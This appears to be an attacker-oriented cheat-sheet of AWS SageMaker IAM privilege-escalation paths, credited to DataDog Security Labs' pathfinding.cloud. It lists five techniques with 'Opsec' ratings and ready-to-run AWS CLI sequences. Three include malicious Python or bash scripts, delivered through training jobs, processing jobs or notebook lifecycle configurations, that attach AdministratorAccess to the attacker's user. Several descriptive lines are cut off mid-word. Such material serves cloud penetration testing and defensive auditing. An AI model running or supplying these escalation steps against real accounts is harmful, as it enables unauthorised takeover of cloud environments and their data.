# SageMaker - AWS IAM Privilege Escalation Paths
> Source: pathfinding.cloud (DataDog Security Labs)

### iam:PassRole + sagemaker:CreateNotebookInstance [added: 2026-04]
- **Tags:** #Iam #Sagemaker #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + sagemaker service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, sagemaker:CreateNotebookInstance; A role must exist that trusts sagemaker.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [sagemaker-001] A principal with `iam:PassRole` and `sagemaker:CreateNotebookInstance` can create a SageMaker notebook instance with a privileged execution role. SageMaker notebooks run Jupyter environments that provide shell access and can execute arbitrary code with the permissions of the attached IAM role. The attacker can then access the notebook and run commands with elevated privileges.
- **Payload/Method:**
```
# Step 1: Create a SageMaker notebook instance with the privileged role
aws sagemaker create-notebook-instance \
  --notebook-instance-name privesc-notebook \
  --instance-type ml.t2.medium \
  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE

# Step 2: Wait for the notebook instance to be in 'InService' status
aws sagemaker describe-notebook-instance --notebook-instance-name privesc-notebook

# Step 3: Generate a presigned URL to access the notebook
aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name privesc-notebook

# Step 4: Access the notebook and execute commands with the privileged role's permissions
Open the presigned URL in a browser and use the Jupyter terminal to execute privileged commands
```

### iam:PassRole + sagemaker:CreateTrainingJob [added: 2026-04]
- **Tags:** #Iam #Sagemaker #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + sagemaker service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, sagemaker:CreateTrainingJob; A role must exist that trusts sagemaker.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [sagemaker-002] A principal with `iam:PassRole` and `sagemaker:CreateTrainingJob` can create a SageMaker training job with a privileged execution role. Training jobs can execute arbitrary container code and access AWS APIs with the permissions of the attached IAM role. By creating a training job with a malicious training script or container, the attacker can execute code with elevated privileges and exfiltrate cr
- **Payload/Method:**
```
# Step 1: Create a malicious training script that attaches AdministratorAccess policy to your user
echo '#!/usr/bin/env python3
import boto3
iam = boto3.client("iam")
iam.attach_user_policy(
    UserName="YOUR_USERNAME",
    PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
)
' > exploit.py

# Step 2: Package and upload the malicious script to S3 (SageMaker requires tar.gz format)
# Package the script as required by SageMaker
tar -czf sourcedir.tar.gz exploit.py
aws s3 cp sourcedir.tar.gz s3://BUCKET_NAME/sourcedir.tar.gz

# Step 3: Create a training job with the privileged role that executes the malicious script via hyperparameters
aws sagemaker create-training-job \
  --training-job-name privesc-training \
  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
  --algorithm-specification '{"TrainingImage":"763104351884.dkr.ecr.REGION.amazonaws.com/pytorch-training:2.0.0-cpu-py310","TrainingInputMode":"File"}' \
  --input-data-config '[{"ChannelName":"training","DataSource":{"S3DataSource":{"S3DataType":"S3Prefix","S3Uri":"s3://BUCKET_NAME","S3DataDistributionType":"FullyReplicated"}}}]' \
  --output-data-config '{"S3OutputPath":"s3://BUCKET_NAME/output"}' \
  --resource-config '{"InstanceType":"ml.m5.large","InstanceCount":1,"VolumeSizeInGB":10}' \
  --stopping-condition '{"MaxRuntimeInSeconds":600}' \
  --hyper-parameters '{"sagemaker_program":"exploit.py","sagemaker_submit_directory":"s3://BUCKET_NAME/sourcedir.tar.gz"}'

# Step 4: Monitor the training job status and wait for execution
aws sagemaker describe-training-job --training-job-name privesc-training
```

### iam:PassRole + sagemaker:CreateProcessingJob [added: 2026-04]
- **Tags:** #Iam #Sagemaker #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** iam:PassRole granted; iam + sagemaker service accessible in target account
- **Prereq:** IAM perms: iam:PassRole, sagemaker:CreateProcessingJob; A role must exist that trusts sagemaker.amazonaws.com to assume it
- **Yields:** Code execution as privileged IAM role; potential admin escalation
- **Opsec:** Med
- **Context:** [sagemaker-003] A principal with `iam:PassRole` and `sagemaker:CreateProcessingJob` can create a SageMaker processing job with a privileged execution role. Processing jobs can execute arbitrary container code for data processing tasks and access AWS APIs with the permissions of the attached IAM role. By creating a processing job with a malicious container or processing script, the attacker can execute code with e
- **Payload/Method:**
```
# Step 1: Create a malicious processing script that attaches AdministratorAccess policy to your user
echo '#!/usr/bin/env python3
import boto3
iam = boto3.client("iam")
iam.attach_user_policy(
    UserName="YOUR_USERNAME",
    PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
)
' > exploit.py

# Step 2: Upload the malicious script to S3
aws s3 cp exploit.py s3://BUCKET_NAME/scripts/exploit.py

# Step 3: Create a processing job with the privileged role that executes the malicious Python script
aws sagemaker create-processing-job \
  --processing-job-name privesc-processing \
  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
  --app-specification '{"ImageUri":"683313688378.dkr.ecr.us-east-1.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3","ContainerEntrypoint":["python3"],"ContainerArguments":["/opt/ml/processing/input/code/exploit.py"]}' \
  --processing-inputs '[{"InputName":"code","S3Input":{"S3Uri":"s3://BUCKET_NAME/scripts/","LocalPath":"/opt/ml/processing/input/code","S3DataType":"S3Prefix","S3InputMode":"File"}}]' \
  --processing-output-config '{"Outputs":[{"OutputName":"output","S3Output":{"S3Uri":"s3://BUCKET_NAME/output/","LocalPath":"/opt/ml/processing/output","S3UploadMode":"EndOfJob"}}]}' \
  --processing-resources '{"ClusterConfig":{"InstanceCount":1,"InstanceType":"ml.t3.medium","VolumeSizeInGB":10}}'

# Step 4: Monitor the processing job status and wait for execution
aws sagemaker describe-processing-job --processing-job-name privesc-processing
```

### sagemaker:CreatePresignedNotebookInstanceUrl [added: 2026-04]
- **Tags:** #Sagemaker #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; sagemaker in scope
- **Prereq:** IAM perms: sagemaker:CreatePresignedNotebookInstanceUrl; A SageMaker notebook instance must exist with an administrative execution role
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [sagemaker-004] A principal with `sagemaker:CreatePresignedNotebookInstanceUrl` can generate a presigned URL to access an existing SageMaker notebook instance. If the notebook instance has a privileged execution role attached, the attacker can access the Jupyter environment and execute arbitrary code with the permissions of that role. This does not require creating a new notebook - only accessing an existing one.
- **Payload/Method:**
```
# Step 1: List available notebook instances to find targets with privileged roles
aws sagemaker list-notebook-instances

# Step 2: Check the notebook's execution role ARN to confirm it has elevated permissions
aws sagemaker describe-notebook-instance --notebook-instance-name TARGET_NOTEBOOK

# Step 3: Generate a presigned URL to access the notebook
aws sagemaker create-presigned-notebook-instance-url \
  --notebook-instance-name TARGET_NOTEBOOK

# Step 4: Access the notebook and execute commands with the privileged role's permissions
Open the presigned URL in a browser and use the Jupyter terminal to execute privileged commands
```

### sagemaker:CreateNotebookInstanceLifecycleConfig + sagemaker:StopNotebookInstance + sagemaker:UpdateNotebookInstance + sagemaker:StartNotebookInstance [added: 2026-04]
- **Tags:** #Sagemaker #Iam #PassRole #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** PassRole on existing resource found; sagemaker + iam in scope
- **Prereq:** IAM perms: sagemaker:CreateNotebookInstanceLifecycleConfig, sagemaker:StopNotebookInstance, sagemaker:UpdateNotebookInstance, sagemaker:StartNotebookInstance; A SageMaker notebook instance must exist in the account
- **Yields:** Code execution as existing privileged role on service
- **Opsec:** Low
- **Context:** [sagemaker-005] A principal with SageMaker notebook management permissions can inject malicious code into an existing notebook instance by creating a malicious lifecycle configuration and attaching it to the notebook. Lifecycle configurations are shell scripts that execute automatically when a notebook starts, and critically, these scripts run with the notebook's execution role credentials rather than the attacke
- **Payload/Method:**
```
# Step 1: Discover available SageMaker notebook instances in the account
aws sagemaker list-notebook-instances

# Step 2: Get details about the target notebook including its execution role ARN and current status
aws sagemaker describe-notebook-instance \
  --notebook-instance-name TARGET_NOTEBOOK_NAME

# Step 3: Verify the notebook's execution role has the desired elevated permissions
aws iam get-role --role-name NOTEBOOK_EXECUTION_ROLE_NAME
aws iam list-attached-role-policies --role-name NOTEBOOK_EXECUTION_ROLE_NAME

# Step 4: Stop the notebook instance (lifecycle configurations can only be modified when the notebook is stopped). Wait for the no
aws sagemaker stop-notebook-instance \
  --notebook-instance-name TARGET_NOTEBOOK_NAME

# Step 5: Create a malicious lifecycle configuration with a script that will grant you administrative access. The script must be b
# Create a base64-encoded malicious script
LIFECYCLE_SCRIPT='#!/bin/bash
set -e
# This script runs with the notebook execution role credentials
aws iam attach-user-policy \
  --user-name YOUR_USERNAME \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
'
ENCODED_SCRIPT=$(echo "$LIFECYCLE_SCRIPT" | base64)

aws sagemaker create-notebook-instance-lifecycle-config \
  --notebook-instance-lifecycle-config-name malicious-lifecycle-config \
  --on-start Content="$ENCODED_SCRIPT"
```
